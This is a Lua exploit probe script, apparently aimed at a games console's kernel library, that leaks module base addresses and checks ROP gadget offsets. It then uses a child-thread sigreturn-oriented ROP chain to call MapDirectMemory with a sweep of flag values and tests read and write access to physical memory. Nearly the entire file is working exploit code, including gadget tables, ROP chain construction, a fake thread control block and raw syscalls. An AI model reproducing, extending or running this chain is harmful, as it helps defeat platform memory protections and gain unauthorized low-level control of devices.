-- CRASH_CLASS: MODERATE
-- PROBE 552a: MapDirectMemory via child thread SROP (sc_addr fix)
--
-- 528c crashed because it used fn_addr as a ROP syscall gadget, but
-- fn_addr bytes are 30 41 2A 11 E5 9F (NOT syscall;ret).
-- Fix: use sc_addr from getcontext(421) RIP-2, which points to the
-- real syscall instruction in libkernel (0F 05; jb .err; ret).
--
-- Strategy:
--   [A] AllocateDirectMemory via fcall (known working)
--   [B] Child thread SROP → MapDirectMemory wrapper (flag sweep)
--   [C] If mapped: read/write physical memory

print("=== PROBE 552a: MAP DIRECT MEMORY (child SROP, sc_addr fix) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore SIGSYS + SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- ============================================================
-- Get eboot base (handle 0)
-- ============================================================
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end

-- ============================================================
-- Get libkernel base (handle 0x2001, fallback scan)
-- ============================================================
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end

if lk_lo == 0 and lk_hi == 0 then
    print("handle 0x2001 empty, scanning 0-0x100...")
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                print(string.format("  found libkernel at h=0x%X", h))
                break
            end
        end
    end
end

if lk_lo == 0 and lk_hi == 0 then
    print("FAIL: libkernel not found"); return
end
print(string.format("libkernel_text=0x%X%08X", lk_hi, lk_lo))
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local function lkaddr(off) return lk_text + uint64(off) end

-- ============================================================
-- Gadgets
-- ============================================================
local G = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    pop_rdx  = 0x3B02D7,
    pop_rcx  = 0xE64,
    mov_m    = 0x92C67,     -- mov [rdi], rax; ret
    bare_ret = 0x42,
}

print("")
print("verifying gadgets...")
local function vg(name, off, expect, nb)
    local d = rd(N(eboot) + off)
    if d == nil then print("  " .. name .. ": UNREADABLE"); return false end
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, nb - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    if (d % (mask + 1)) ~= expect then
        print(string.format("  %s: MISMATCH got=0x%X want=0x%X", name, d % (mask + 1), expect))
        return false
    end
    return true
end

local gok = true
gok = vg("pop_rax", G.pop_rax, 0xC358, 2) and gok
gok = vg("pop_rdi", G.pop_rdi, 0xC35F, 2) and gok
gok = vg("pop_rsi", G.pop_rsi, 0xC35E, 2) and gok
gok = vg("pop_rdx", G.pop_rdx, 0xC35A, 2) and gok
gok = vg("pop_rcx", G.pop_rcx, 0xC359, 2) and gok
gok = vg("mov_m", G.mov_m, 0xC3078948, 4) and gok
gok = vg("bare_ret", G.bare_ret, 0xC3, 1) and gok

if not gok then
    if vg("pop_rdi_alt", 0x75DFE, 0xC35F, 2) then
        G.pop_rdi = 0x75DFE
        print("  using alt pop_rdi=0x75DFE")
        gok = true
    else
        print("FAIL: gadgets broken"); return
    end
end
print("  gadgets OK")

if not alive() then print("DIED verifying gadgets"); return end

-- ============================================================
-- Capture sc_addr from getcontext (THE FIX for 528c)
-- ============================================================
-- mcontext_t layout at ucontext+0x40:
--   +0x08=rdi +0x10=rsi +0x18=rdx +0x20=r10 +0x28=r8 +0x30=r9
--   +0x38=rax +0x40=rbx +0x48=rbp +0x50=rcx
--   +0xA0=rip +0xB8=rsp
local MC = 0x40

local gc_ctx = memory.alloc(0x500)
pcall(function() return mk(421)(uint64(gc_ctx)) end)
local rip_val = rq(N(gc_ctx) + MC + 0xA0)
if not rip_val then print("FAIL: getcontext"); return end
local rh, rl = get_hi_lo(rip_val)
if rh < 0 then rh = rh + 0x100000000 end
if rl < 0 then rl = rl + 0x100000000 end
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. fmt(sc_addr))

-- Verify SROP from main thread
local srop_pid = nil
do
    pcall(function() return mk(421)(uint64(gc_ctx)) end)
    wq(N(gc_ctx) + MC + 0xA0, sc_addr)
    wq(N(gc_ctx) + MC + 0x38, uint64(20))  -- rax = getpid
    local ok, rv = pcall(function() return mk(417)(uint64(gc_ctx)) end)
    if ok then srop_pid = N(rv) end
end
print("SROP getpid=" .. (srop_pid or "FAIL"))
if not srop_pid or srop_pid ~= pid then
    print("SROP BROKEN"); return
end
print("SROP verified OK")

-- ============================================================
-- [A] AllocateDirectMemory
-- ============================================================
print("")
print("[A] sceKernelAllocateDirectMemory")

local alloc_fn = lkaddr(0x17EF0)
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))

local ok_a, alloc_rv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)

if not ok_a then print("  AllocateDirectMemory CRASHED"); return end
print("  ret=" .. N(alloc_rv))
local phys_addr = rq(N(phys_out))
print("  phys=" .. fmt(phys_addr))

if not phys_addr or N(alloc_rv) ~= 0 then
    print("  ALLOC FAILED"); return
end
print("  ALLOCATED OK")
if not alive() then print("DIED after alloc"); return end

-- ============================================================
-- [B] MapDirectMemory via child thread + SROP
-- ============================================================
-- MapDirectMemory ABI (7 args, SysV C calling convention):
--   rdi = void **virtAddrOut
--   rsi = size_t len
--   rdx = int prot
--   rcx = int flags
--   r8  = off_t physAddr
--   r9  = size_t alignment
--   [rsp+8] = const char *name (7th arg, on stack)
--
-- Child thread flow:
--   1. bare_ret entry → ROP chain
--   2. sysarch(SET_FSBASE=129, &fake_tcb)  [via sc_addr]
--   3. getcontext(421, &uctx)               [via sc_addr]
--   4. Patch uctx via mov_m: rdi,rsi,rdx,rcx,r8,r9,rip,rsp
--   5. sigreturn(417, &uctx)                [via sc_addr]
--   6. MapDirectMemory runs with all 7 args
--   7. ret → epilogue ROP → store result → thr_exit

print("")
print("[B] MapDirectMemory via child SROP (flag sweep)")

local sc455 = mk(455)
local sc_mmap = mk(477)

local shared = memory.alloc(0x100)
-- shared+0x00: MapDirectMemory return value (rax)
-- shared+0x08: reserved
-- shared+0x10: done flag (0xDEAD when child finishes)
-- shared+0x18: sysarch marker (0xAAAA)
-- shared+0x20: getcontext marker (0xBBBB)
-- shared+0x28: pre-sigreturn marker (0xCCCC)

local map_ok = false
local mapped_va = nil
local map_fn = lkaddr(0x15020)

local flag_list = {0, 0x10, 0x12, 1, 2, 0x100, 0x412, 0x1000, 0x10002}

for fi, flags in ipairs(flag_list) do
    if not alive() then
        print("  PROCESS DIED"); return
    end

    z(shared, 0x100)

    local virt_out = memory.alloc(8)
    wq(N(virt_out), uint64(0))

    -- Child stack (2 MiB)
    local cstack_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if not cstack_raw or N(cstack_raw) == 0 then
        print("  mmap child stack failed"); return
    end
    local cstack = N(cstack_raw)

    -- Fake TCB (4KB self-referencing)
    local tcb = memory.alloc(0x1000)
    z(tcb, 0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), uint64(N(tcb)))

    -- ucontext buffer in Lua heap (not child stack)
    local uctx = memory.alloc(0x500)
    local uctx_addr = N(uctx)
    z(uctx_addr, 0x500)

    -- Post-MapDirectMemory epilogue ROP chain
    local epi_addr = cstack + 0x2000
    z(epi_addr, 0x200)
    local ep = epi_addr
    local function ewq(v) wq(ep, v); ep = ep + 8 end

    -- After MapDirectMemory returns, rax = return value.
    -- Store rax to shared+0x00 via mov_m
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(N(shared)))           -- rdi = &shared[0]
    ewq(eaddr(G.mov_m))              -- [shared+0] = rax (map rv)

    -- Store done flag 0xDEAD at shared+0x10
    ewq(eaddr(G.pop_rax))
    ewq(uint64(0xDEAD))
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(N(shared) + 0x10))
    ewq(eaddr(G.mov_m))

    -- thr_exit(431)
    ewq(eaddr(G.pop_rax))
    ewq(uint64(431))
    ewq(eaddr(G.pop_rdi))
    ewq(uint64(0))
    ewq(sc_addr)                     -- *** sc_addr NOT stub ***

    -- MapDirectMemory fake stack: function enters with RSP pointing here
    --   [RSP+0] = return address → epilogue
    --   [RSP+8] = 7th arg (name = NULL)
    -- Must be 16-byte aligned + 8 for SysV post-call alignment
    local fn_rsp = cstack + 0x3008   -- cstack is page-aligned, +0x3008 ≡ 8 (mod 16)
    wq(fn_rsp, uint64(epi_addr))     -- return to epilogue
    wq(fn_rsp + 8, uint64(0))        -- name = NULL

    -- Build child primary ROP chain
    local chain_off = 0x100000       -- 1 MiB into 2 MiB stack
    local chain_base = cstack + chain_off + 8  -- ≡ 8 (mod 16)
    local pos = chain_base

    local function emit(v) wq(pos, v); pos = pos + 8 end

    -- Step 1: sysarch(SET_FSBASE=129, &tcb_ptr)
    emit(eaddr(G.pop_rax)); emit(uint64(165))
    emit(eaddr(G.pop_rdi)); emit(uint64(129))
    emit(eaddr(G.pop_rsi)); emit(uint64(N(tcb_ptr)))
    emit(sc_addr)                     -- *** sc_addr NOT stub ***

    -- Marker: sysarch done
    emit(eaddr(G.pop_rax)); emit(uint64(0xAAAA))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x18))
    emit(eaddr(G.mov_m))

    -- Step 2: getcontext(421, &uctx)
    emit(eaddr(G.pop_rax)); emit(uint64(421))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr))
    emit(sc_addr)                     -- *** sc_addr NOT stub ***

    -- Marker: getcontext done
    emit(eaddr(G.pop_rax)); emit(uint64(0xBBBB))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x20))
    emit(eaddr(G.mov_m))

    -- Step 3: Patch ucontext fields for MapDirectMemory call
    -- mc_rip = MapDirectMemory entry
    emit(eaddr(G.pop_rax)); emit(map_fn)
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0xA0))
    emit(eaddr(G.mov_m))

    -- mc_rsp = fake stack for the function
    emit(eaddr(G.pop_rax)); emit(uint64(fn_rsp))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0xB8))
    emit(eaddr(G.mov_m))

    -- mc_rdi = &virt_out
    emit(eaddr(G.pop_rax)); emit(uint64(N(virt_out)))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x08))
    emit(eaddr(G.mov_m))

    -- mc_rsi = 0x4000 (len = one 16KB page)
    emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x10))
    emit(eaddr(G.mov_m))

    -- mc_rdx = 3 (PROT_READ|PROT_WRITE)
    emit(eaddr(G.pop_rax)); emit(uint64(3))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x18))
    emit(eaddr(G.mov_m))

    -- mc_rcx = flags (SysV C ABI 4th arg, NOT r10)
    emit(eaddr(G.pop_rax)); emit(uint64(flags))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x50))
    emit(eaddr(G.mov_m))

    -- mc_r8 = physAddr
    emit(eaddr(G.pop_rax)); emit(phys_addr)
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x28))
    emit(eaddr(G.mov_m))

    -- mc_r9 = 0x4000 (alignment)
    emit(eaddr(G.pop_rax)); emit(uint64(0x4000))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr + MC + 0x30))
    emit(eaddr(G.mov_m))

    -- Marker: pre-sigreturn
    emit(eaddr(G.pop_rax)); emit(uint64(0xCCCC))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x28))
    emit(eaddr(G.mov_m))

    -- Step 4: sigreturn(417, &uctx) → all regs replaced → MapDirectMemory
    emit(eaddr(G.pop_rax)); emit(uint64(417))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr))
    emit(sc_addr)                     -- *** sc_addr NOT stub ***

    local chain_len = pos - chain_base
    print(string.format("  [%d] flags=0x%X chain=%d bytes", fi, flags, chain_len))

    -- thr_new setup
    local child_stack_sz = chain_off + 0x10
    local param = memory.alloc(0x40)
    z(param, 0x40)
    wq(N(param) + 0x00, eaddr(G.bare_ret))
    wq(N(param) + 0x08, uint64(0))
    wq(N(param) + 0x10, uint64(cstack))
    wq(N(param) + 0x18, uint64(child_stack_sz))
    local tid_p = memory.alloc(8)
    wq(N(tid_p), uint64(0))
    wq(N(param) + 0x30, uint64(N(tid_p)))

    -- Launch child
    local ok_t, ret_t = pcall(function()
        return sc455(uint64(N(param)), uint64(0x38))
    end)

    if not ok_t or (ret_t and N(ret_t) ~= 0) then
        print(string.format("  thr_new failed: ok=%s rv=%s", tostring(ok_t),
            ret_t and tostring(N(ret_t)) or "nil"))
    else
        -- Wait for child (spin on done flag)
        local done = false
        for timeout = 1, 500000 do
            local flag = rq(N(shared) + 0x10)
            if flag and N(flag) == 0xDEAD then
                done = true
                break
            end
            if timeout % 100000 == 0 then
                if not alive() then break end
            end
        end

        if not alive() then
            print(string.format("  flags=0x%X: PROCESS KILLED", flags))
            -- Print markers before dying
            local m1 = rq(N(shared) + 0x18)
            local m2 = rq(N(shared) + 0x20)
            local m3 = rq(N(shared) + 0x28)
            print(string.format("  markers: sysarch=%s gc=%s pre_sr=%s",
                m1 and fmt(m1) or "nil", m2 and fmt(m2) or "nil",
                m3 and fmt(m3) or "nil"))
            return
        end

        local child_tid = rq(N(tid_p))
        local rv_raw = rq(N(shared))
        local va = rq(N(virt_out))
        local m_sysarch = rq(N(shared) + 0x18)
        local m_gc = rq(N(shared) + 0x20)
        local m_sr = rq(N(shared) + 0x28)

        print(string.format("  markers: sysarch=%s gc=%s pre_sr=%s done=%s",
            m_sysarch and fmt(m_sysarch) or "nil",
            m_gc and fmt(m_gc) or "nil",
            m_sr and fmt(m_sr) or "nil",
            tostring(done)))

        if done then
            local rv = rv_raw and N(rv_raw) or -1
            print(string.format("  flags=0x%X: rv=%d va=%s done=YES",
                flags, rv, fmt(va)))

            if rv == 0 and va then
                local vah, val_ = get_hi_lo(va)
                if vah < 0 then vah = vah + 0x100000000 end
                if val_ < 0 then val_ = val_ + 0x100000000 end
                if vah ~= 0 or val_ > 0x1000 then
                    print("  *** MapDirectMemory SUCCEEDED ***")
                    print("  mapped VA=" .. fmt(va))
                    mapped_va = va
                    map_ok = true
                    break
                else
                    print("  va looks zero/invalid")
                end
            else
                print(string.format("  MapDirectMemory returned %d", rv))
            end
        else
            print(string.format("  flags=0x%X: TIMEOUT (no done flag)", flags))
        end
    end
end

-- ============================================================
-- [C] If mapped: read/write physical memory
-- ============================================================
if map_ok and mapped_va then
    print("")
    print("[C] Physical memory R/W test")

    -- Write a magic value
    local ok_w = pcall(function() memory.write_dword(mapped_va, 0xDEADBEEF) end)
    print("  write 0xDEADBEEF: " .. tostring(ok_w))

    -- Read it back
    local v = rd(mapped_va)
    print("  read back: " .. (v and string.format("0x%X", v) or "nil"))

    if v == 0xDEADBEEF then
        print("")
        print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
        print("  phys=" .. fmt(phys_addr))
        print("  virt=" .. fmt(mapped_va))
    end

    -- Read first 64 bytes
    print("")
    print("  first 64 bytes:")
    for off = 0, 60, 4 do
        local d = rd(mapped_va + off)
        if d then
            if d < 0 then d = d + 0x100000000 end
            io.write(string.format("%08X ", d))
        else
            io.write("???????? ")
        end
        if off % 16 == 12 then print("") end
    end
else
    print("")
    print("MapDirectMemory failed for all flag values")
end

print("")
print("DONE")
